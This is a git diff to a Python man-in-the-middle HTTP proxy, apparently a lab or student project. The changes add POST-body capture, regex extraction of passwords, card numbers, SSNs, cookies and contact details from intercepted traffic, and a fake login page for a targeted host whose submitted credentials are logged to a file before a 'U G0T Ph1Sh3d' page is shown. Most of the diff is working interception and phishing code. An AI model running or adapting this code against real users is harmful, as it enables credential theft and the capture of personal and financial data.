@@ -14,6 +14,7 @@ from urllib.parse import unquote
 
 args = None
 file_lock = threading.Lock()
+target_url = "example.com"
 
 
 # Get the command line arguments
@@ -53,21 +54,25 @@ def get_info(pattern: re.Pattern[str], lines: list[str]) -> list[str]:
 
 
 def passive(data: str, url: str):
+    print("[*] Searching for info in the request")
+    print("[@] Request: ", data)
+
     search_lines = data.split("\r\n")
 
     username_pattern = re.compile(r"\buser(?:name)?=([^&\s]+)")
     password_pattern = re.compile(r"\bpass(?:word)?=([^&\s]+)")
-    email_pattern = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b")
-    credit_card_pattern = re.compile(r"\b(?:\d{4}[- ]?){3}\d{4}\b")
-    ssn_pattern = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")
-    name_pattern = re.compiler(r"\b[A-Z][a-z]+ [A-Z][a-z]+\b")
+    email_pattern = re.compile(r"\b([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})\b")
+    credit_card_pattern = re.compile(r"\b((?:\d{4}[- ]?){3}\d{4})\b")
+    ssn_pattern = re.compile(r"\b(\d{3}-\d{2}-\d{4})\b")
+    name_pattern = re.compile(r"\b([A-Z][a-z]+ [A-Z][a-z]+)\b")
     address_pattern = re.compile(
-        r"\b\d+\s[A-Z][a-zA-Z\s]+\b,?\s[A-Z]{2}\s\d{5}(-\d{4})?"
+        r"\b(\d+\s[A-Z][a-zA-Z\s]+,?\s[A-Z]{2}\s\d{5}(-\d{4})?)\b"
     )
-    phone_pattern = re.compiler(r"\b(\(\d{3}\)\s?|\d{3}[-.\s])?\d{3}[-.\s]\d{4}\b")
+    phone_pattern = re.compile(r"\b((\(\d{3}\)\s?|\d{3}[-.\s])?\d{3}[-.\s]\d{4})\b")
     cookie_pattern = re.compile(r"Cookie:\s?(.*)")
 
     # Search for matches
+
     usernames = get_info(username_pattern, search_lines)
     passwords = get_info(password_pattern, search_lines)
     emails = get_info(email_pattern, search_lines)
@@ -208,6 +213,20 @@ def get_data(socket: socket):
     return data
 
 
+def get_body(socket: socket, length:int, _body=b"") -> bytes:
+    body = _body
+
+    while len(body) < length:
+        chunk = socket.recv(min(length - len(body), 4096))
+
+        if not chunk:
+            break  # Connection closed or error
+
+        body += chunk
+
+    return body
+
+
 def get_encoding(http: str) -> str:
     pattern = re.compile(r"Content-Encoding:\s*([a-zA-Z0-9-]+)")
 
@@ -234,17 +253,23 @@ def get_query(req: str) -> dict[str, str]:
 
     url = unquote(req.split("\r\n")[0].split(" ")[1])
 
-    for param in urlparse(url).query.split("&"):
+    return query_params(urlparse(url).query)
+
+
+def query_params(req: str) -> dict[str, str]:
+    query = {}
+
+    for param in req.split("&"):
         key, value = param.split("=")
         query[key] = value
 
     return query
 
 
-def log_query(query: dict[str, str]):
+def log_query(query: dict[str, str], msg: str):
     with file_lock:
         with open("info_2.txt", "a") as f:
-            f.write(f"Fingerprint:\n")
+            f.write(f"{msg}:\n")
 
             for key, value in query.items():
                 f.write(f"{key}: {value}\n")
@@ -252,10 +277,47 @@ def log_query(query: dict[str, str]):
             f.write("\n")
 
 
+def get_fake_headers(body_length: int) -> bytes:
+    utc_time = datetime.datetime.utcnow()
+
+    # Format the time in the RFC 1123 format (e.g., Mon, 23 Nov 2023 12:00:00 GMT)
+    format_gmt_time = utc_time.strftime("%a, %d %b %Y %H:%M:%S GMT")
+
+    headers = f"""
+        HTTP/1.1 200 OK
+        Date: {format_gmt_time}
+        Server: Apache/2.4.41 (Unix)
+        Content-Type: text/html; charset=UTF-8
+        Content-Length: {body_length}
+        Connection: close""".strip().encode(
+        "utf-8"
+    )
+
+    return headers
+
+
+def get_phishing_response() -> bytes:
+    body = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Phishing Page</title>
+        </head>
+        <body>
+            <h1>U G0T Ph1Sh3d</h1>
+        </body>
+        </html>
+        """.strip().encode(
+        "utf-8"
+    )
+
+    headers = get_fake_headers(len(body))
+
+    return headers + b"\r\n\r\n" + body
+
+
 def get_fake_login() -> bytes:
     global args
-
-    print("[*] Generating fake login page")
 
     body = f"""
         <!DOCTYPE html>
@@ -314,7 +376,7 @@ def get_fake_login() -> bytes:
         <body>
             <div class="login-container">
                 <h2>Login</h2>
-                <form action="http://{args.address}:{args.port}/login" method="post">
+                <form action="login" method="get">
                     <input type="text" name="username" placeholder="Username" required>
                     <input type="password" name="password" placeholder="Password" required>
                     <button type="submit">Login</button>
@@ -322,27 +384,24 @@ def get_fake_login() -> bytes:
             </div>
         </body>
         </html>
-        """.encode(
-        "utf-8"
-    )
+        """
 
-    utc_time = datetime.datetime.utcnow()
+    body = active(body).strip().encode("utf-8")
 
-    # Format the time in the RFC 1123 format (e.g., Mon, 23 Nov 2023 12:00:00 GMT)
-    format_gmt_time = utc_time.strftime("%a, %d %b %Y %H:%M:%S GMT")
-
-    headers = f"""
-        HTTP/1.1 200 OK
-        Date: {format_gmt_time}
-        Server: Apache/2.4.41 (Unix)
-        Content-Type: text/html; charset=UTF-8
-        Content-Length: {len(body)}
-        Connection: close""".strip().encode(
-        "utf-8"
-    )
+    headers = get_fake_headers(len(body))
 
     return headers + b"\r\n\r\n" + body
 
+def get_method(req: str) -> str:
+    return req.split("\r\n")[0].split(" ")[0]
+
+def get_content_length(req: str) -> int:
+    match = re.search(r"Content-Length:\s*(\d+)", req)
+
+    if match:
+        return int(match.group(1))
+
+    return 0
 
 def handle_client(client_sock: socket, passive_mode: bool):
     try:
@@ -359,25 +418,50 @@ def handle_client(client_sock: socket, passive_mode: bool):
 
             # Get the URL from the request based on the host header
             url = get_url(request)
+            method = get_method(request)
 
             if not url:
-                print("[!] No URL found, skipping...")
-                continue
+                print("[!] No URL found...")
+                break
 
             if passive_mode:
-                passive(request, url)
+                if method == "GET":
+                    passive(request, url)
+                elif method == "POST":
+                    body_length = get_content_length(request)
+                    body = get_body(client_sock, body_length).strip().decode("utf-8")
+
+                    print("[*] Body of the post request: ", body)
+
+                    passive(request + body, url)
             else:
                 if url == f"{args.address}:{args.port}":
                     print("[*] Obtained data from the client")
 
-                    log_query(get_query(request))
-                    # save those data in a file
+                    log_query(get_query(request), "Fingerprint")
 
                     client_sock.sendall(b"HTTP/1.1 200 OK\r\n\r\n")
-                    continue
-                elif url == "example.com":
-                    print("[*] Redirecting to fake login page")
-                    res = get_fake_login()
+                    break
+                elif url == target_url:
+                    path = urlparse(request.split("\r\n")[0].split(" ")[1]).path
+                    res = b""
+
+                    if path == "/login":
+                        print("[*] Received phishing login credentials")
+
+                        if method == "GET":
+                            log_query(get_query(request), "Phishing")
+                        elif method == "POST":
+                            body_length = get_content_length(request)
+                            body = get_body(client_sock, body_length).decode("utf-8")
+
+                            log_query(query_params(body), "Phishing")
+
+                        res = get_phishing_response()
+                    elif path == "/" or path == "":
+                        print("[*] Redirecting to fake login page")
+                        res = get_fake_login()
+
                     client_sock.sendall(res)
                     break
 
@@ -394,11 +478,17 @@ def handle_client(client_sock: socket, passive_mode: bool):
             print(f"[*] Received {len(response_data)} bytes from the server.")
 
             # Split the response into headers and body
-            response_components = response_data.split(b"\r\n\r\n")
+            response = response_data.split(b"\r\n\r\n")
 
-            headers = response_components[0].decode("utf-8")
+            headers = response[0].decode("utf-8")
+            body = response[1]
 
-            body, encoding = decode_body(headers, response_components[1])
+            body_length = get_content_length(headers)
+
+            if body_length > 0:
+                body = get_body(proxy_socket, body_length, body)
+            
+            body, encoding = decode_body(headers, body)
 
             if passive_mode:
                 passive(headers + "\r\n" + body, url)
@@ -414,9 +504,14 @@ def handle_client(client_sock: socket, passive_mode: bool):
                     + b"\r\n\r\n"
                     + injected
                 )
+            # TODO: the response from the server needs to be retrieved, the get data method gets just the headers
+            # plus a small portion of the body, the rest of the body needs to be retrieved with the method used in
+            # the request for the POST
+            print(response_data)
 
             client_sock.sendall(response_data)
-
+    except Exception as e:
+        print(f"[!] An error occurred {e}")
     finally:
         client_sock.close()
 
